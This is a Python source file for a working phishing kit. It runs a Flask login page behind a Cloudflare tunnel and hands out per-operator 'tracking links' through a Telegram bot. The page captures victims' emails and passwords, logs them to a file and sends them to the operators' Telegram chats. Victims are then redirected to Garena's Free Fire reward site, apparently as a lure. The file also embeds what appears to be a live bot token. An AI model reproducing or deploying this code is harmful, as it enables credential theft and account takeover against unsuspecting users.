import threading
import datetime
import requests
import json
import os
import subprocess
import re
import time
from flask import Flask, render_template, request, redirect, Response
# নতুন ইম্পোর্ট
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# --- ⚙️ Configuration Section (এই অংশটি পূরণ করুন) ⚙️ ---
BOT_TOKEN = "7451475228:AAHLkPmSyBu5qJQIcK6ANit5coTy6LVPs2E"
BOSS_ADMIN_ID = 5172723202

# --- Global Variables & Constants ---
LOG_FILE = "credentials.txt"
ADMINS_FILE = "admins.json"
app = Flask(__name__)

# --- Helper Functions (No changes here) ---
def load_admins():
    if not os.path.exists(ADMINS_FILE):
        save_admins({BOSS_ADMIN_ID})
        return {BOSS_ADMIN_ID}
    try:
        with open(ADMINS_FILE, 'r') as f: return set(json.load(f))
    except (json.JSONDecodeError, FileNotFoundError): return {BOSS_ADMIN_ID}

def save_admins(admin_set):
    with open(ADMINS_FILE, 'w') as f: json.dump(list(admin_set), f, indent=4)

AUTHORIZED_ADMINS = load_admins()

def is_boss(user_id): return user_id == BOSS_ADMIN_ID

# --- Telegram Bot Command Handlers (Updated with new context type) ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in AUTHORIZED_ADMINS:
        message = ("✅ **Welcome, Authorized Admin!**\n\n"
                   "Use /getlink to generate your unique tracking link.\n"
                   "The link might take a moment to be ready after a restart.\n\n")
        if is_boss(user_id):
            message += ("👑 **Boss Admin Commands:**\n"
                        "/addadmin <user_id>\n"
                        "/removeadmin <user_id>\n"
                        "/listadmins")
        await update.message.reply_text(message, parse_mode='Markdown')
    else:
        await update.message.reply_text("🚫 Access Denied.")

async def get_link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_ADMINS:
        await update.message.reply_text("🚫 Access Denied.")
        return
    base_url = context.bot_data.get('base_url')
    if not base_url:
        await update.message.reply_text("⏳ Cloudflare link is not ready yet. Please wait about 15 seconds and try again.")
        return
    tracking_link = f"{base_url}/track/{user_id}"
    await update.message.reply_text(f"🔗 Your unique link:\n\n`{tracking_link}`", parse_mode='Markdown')

async def add_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_boss(update.effective_user.id):
        await update.message.reply_text("🚫 Only the Boss Admin can use this command.")
        return
    try:
        new_admin_id = int(context.args[0])
        AUTHORIZED_ADMINS.add(new_admin_id)
        save_admins(AUTHORIZED_ADMINS)
        await update.message.reply_text(f"✅ Admin {new_admin_id} has been added.")
    except (IndexError, ValueError):
        await update.message.reply_text("⚠️ Usage: /addadmin <user_id>")

async def remove_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_boss(update.effective_user.id):
        await update.message.reply_text("🚫 Only the Boss Admin can use this command.")
        return
    try:
        admin_to_remove = int(context.args[0])
        if admin_to_remove == BOSS_ADMIN_ID:
            await update.message.reply_text("🚫 The Boss Admin cannot be removed.")
            return
        if admin_to_remove in AUTHORIZED_ADMINS:
            AUTHORIZED_ADMINS.remove(admin_to_remove)
            save_admins(AUTHORIZED_ADMINS)
            await update.message.reply_text(f"✅ Admin {admin_to_remove} has been removed.")
        else:
            await update.message.reply_text(f"⚠️ Admin {admin_to_remove} not found.")
    except (IndexError, ValueError):
        await update.message.reply_text("⚠️ Usage: /removeadmin <user_id>")

async def list_admins_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_boss(update.effective_user.id):
        await update.message.reply_text("🚫 Only the Boss Admin can use this command.")
        return
    admin_list = "\n".join([f"- `{aid}` {'(Boss)' if aid == BOSS_ADMIN_ID else ''}" for aid in AUTHORIZED_ADMINS])
    await update.message.reply_text(f"📜 **Authorized Admins:**\n{admin_list}", parse_mode='Markdown')

# --- Flask Routes (No changes here) ---
@app.route('/track/<int:admin_id>')
def track_page(admin_id):
    if admin_id in AUTHORIZED_ADMINS: return render_template('index.html', admin_id=admin_id)
    return "🚫 Invalid or unauthorized tracking link.", 403

@app.route('/login', methods=['POST'])
def login():
    admin_id = int(request.form.get('admin_id'))
    source = request.form.get('source')
    email = request.form.get('email')
    password = request.form.get('password')
    if email and password and admin_id:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"Timestamp: {timestamp}\nAdmin ID: {admin_id}\nSource: {source}\nEmail: {email}\nPassword: {password}\n---\n"
        with open(LOG_FILE, "a") as f: f.write(log_entry)
        message = (f"*🔥 New Login via link from Admin `{admin_id}` 🔥*\n\n"
                   f"*Source:* `{source}`\n*📧 Email/Phone:* `{email}`\n*🔑 Password:* `{password}`\n\n`{timestamp}`")
        if admin_id != BOSS_ADMIN_ID: send_to_telegram(admin_id, message)
        send_to_telegram(BOSS_ADMIN_ID, message)
    return redirect("https://reward.ff.garena.com/en", code=302)

def send_to_telegram(chat_id, message):
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
    try: requests.post(api_url, json=payload)
    except Exception as e: print(f"Error sending to Telegram: {e}")

# --- Automation and Main Execution (Updated) ---
def start_cloudflared(bot_data):
    try:
        command = "cloudflared"
        process = subprocess.Popen([command, "tunnel", "--url", "http://localhost:5000"],
                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        print("☁️ Starting Cloudflare Tunnel...")
        for line in iter(process.stdout.readline, ''):
            print(line.strip())
            url_match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if url_match:
                url = url_match.group(0)
                bot_data['base_url'] = url
                print(f"✅ Public URL found and set: {url}")
                send_to_telegram(BOSS_ADMIN_ID, f"✅ Server is online!\nPublic URL: {url}")
                break
        process.wait()
    except FileNotFoundError:
        print("❌ Error: 'cloudflared' command not found. Please install it.")
    except Exception as e:
        print(f"❌ Cloudflare Tunnel Error: {e}")

def run_flask():
    print("🚀 Starting Flask server...")
    app.run(host='0.0.0.0', port=5000, debug=False)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("getlink", get_link_command))
    application.add_handler(CommandHandler("addadmin", add_admin_command))
    application.add_handler(CommandHandler("removeadmin", remove_admin_command))
    application.add_handler(CommandHandler("listadmins", list_admins_command))

    flask_thread = threading.Thread(target=run_flask)
    cloudflared_thread = threading.Thread(target=start_cloudflared, args=(application.bot_data,))

    flask_thread.daemon = True
    cloudflared_thread.daemon = True

    flask_thread.start()
    time.sleep(1)
    cloudflared_thread.start()

    print("🤖 Starting Telegram bot polling...")
    application.run_polling()

if __name__ == '__main__':
    main()
